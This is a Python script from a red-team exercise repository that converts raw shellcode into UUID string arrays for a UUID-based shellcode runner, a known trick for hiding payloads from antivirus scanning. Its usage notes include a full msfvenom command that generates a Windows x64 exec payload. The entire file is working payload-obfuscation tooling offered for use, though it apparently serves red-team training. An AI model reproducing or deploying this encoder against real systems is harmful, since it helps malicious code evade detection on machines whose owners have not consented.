#!/usr/bin/env python3
"""
Red Team Exercises #60 - Shellcode to UUID Converter
Author: Joas Antonio dos Santos
Repository: https://github.com/CyberSecurityUP/Red-Team-Exercises

Converts raw shellcode binary into UUID string format for use
with the UUID shellcode runner PoC.

Usage:
    python3 shellcode_to_uuid.py -i payload.bin
    python3 shellcode_to_uuid.py -i payload.bin -o output.h

    # Generate shellcode with msfvenom first:
    # msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin
"""

import argparse
import uuid
import sys
import os


def shellcode_to_uuids(shellcode_bytes):
    """Convert raw shellcode bytes to UUID strings (16 bytes per UUID)."""
    uuids = []

    # Pad to multiple of 16
    padding = 16 - (len(shellcode_bytes) % 16)
    if padding != 16:
        shellcode_bytes += b'\x00' * padding

    for i in range(0, len(shellcode_bytes), 16):
        chunk = shellcode_bytes[i:i+16]
        # Convert 16 bytes to UUID string format
        uuid_str = str(uuid.UUID(bytes_le=chunk))
        uuids.append(uuid_str)

    return uuids


def generate_cpp_array(uuids):
    """Generate C++ array declaration from UUID list."""
    lines = ['const char* shellcode_uuids[] = {']
    for i, u in enumerate(uuids):
        comma = ',' if i < len(uuids) - 1 else ''
        lines.append(f'    "{u}"{comma}')
    lines.append('};')
    lines.append(f'\nint num_uuids = {len(uuids)};')
    return '\n'.join(lines)


def main():
    parser = argparse.ArgumentParser(
        description='Convert shellcode to UUID string array')
    parser.add_argument('-i', '--input', required=True,
                        help='Input shellcode binary file')
    parser.add_argument('-o', '--output', default=None,
                        help='Output file (default: stdout)')
    parser.add_argument('-f', '--format', choices=['cpp', 'python'],
                        default='cpp', help='Output format')
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[-] File not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    with open(args.input, 'rb') as f:
        shellcode = f.read()

    print(f"[*] Read {len(shellcode)} bytes from {args.input}", file=sys.stderr)

    uuids = shellcode_to_uuids(shellcode)
    print(f"[+] Generated {len(uuids)} UUIDs", file=sys.stderr)

    if args.format == 'cpp':
        output = generate_cpp_array(uuids)
    else:
        lines = ['shellcode_uuids = [']
        for i, u in enumerate(uuids):
            comma = ',' if i < len(uuids) - 1 else ''
            lines.append(f'    "{u}"{comma}')
        lines.append(']')
        output = '\n'.join(lines)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(output)
        print(f"[+] Written to {args.output}", file=sys.stderr)
    else:
        print(output)


if __name__ == '__main__':
    main()
